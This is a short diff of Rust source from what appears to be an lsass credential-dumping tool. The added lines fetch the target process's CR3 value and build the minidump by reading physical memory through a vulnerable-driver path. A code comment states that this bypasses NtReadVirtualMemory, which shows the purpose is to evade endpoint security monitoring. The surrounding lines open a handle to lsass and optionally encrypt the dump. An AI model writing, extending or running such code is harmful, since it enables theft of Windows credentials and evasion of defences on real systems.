@@ -381,9 +381,21 @@ fn run_winio_flow(cli: &Cli, api: &resolver::ApiResolver, lsass_pid: u32) -> Res
         .map_err(|e| format!("Open process failed: {}", e))?;
     println!("[+] Handle acquired: {:?}", lsass_handle);
 
-    println!("[*] Step 4: Building output...");
-    let dump_result =
-        minidump::create_minidump(api, lsass_handle, lsass_pid, &cli.output, cli.encrypt);
+    // Get CR3 for physical memory dump (bypasses NtReadVirtualMemory entirely)
+    println!("[*] Step 3b: Acquiring CR3...");
+    let cr3 = engine
+        .get_process_cr3(lsass_pid)
+        .map_err(|e| format!("CR3 acquisition failed: {}", e))?;
+
+    println!("[*] Step 4: Building output via physical memory...");
+    let dump_result = minidump::create_minidump_phys(
+        api,
+        lsass_handle,
+        cr3,
+        &|pa, buf| engine.read_phys(pa, buf),
+        &cli.output,
+        cli.encrypt,
+    );
 
     unsafe {
         let fn_close: unsafe extern "system" fn(
